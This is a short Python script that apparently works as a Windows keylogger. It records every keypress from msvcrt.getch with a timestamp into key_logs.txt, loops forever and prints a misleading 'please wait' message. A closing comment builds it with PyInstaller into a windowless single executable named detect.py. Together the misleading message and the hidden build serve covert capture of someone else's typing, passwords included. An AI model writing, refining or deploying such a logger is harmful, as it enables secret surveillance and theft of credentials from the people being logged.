import msvcrt
import time
def get_key():
    return msvcrt.getch()
def log_key_press(key):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')  
    with open('key_logs.txt', 'a') as file:
        file.write(f'{timestamp} - Pressed: {key}\n')  
while True:
    key=get_key()
    log_key_press(key)
    print('please wait for python to be executing your script...')

#  python -m PyInstaller --onefile --noconsole detect.py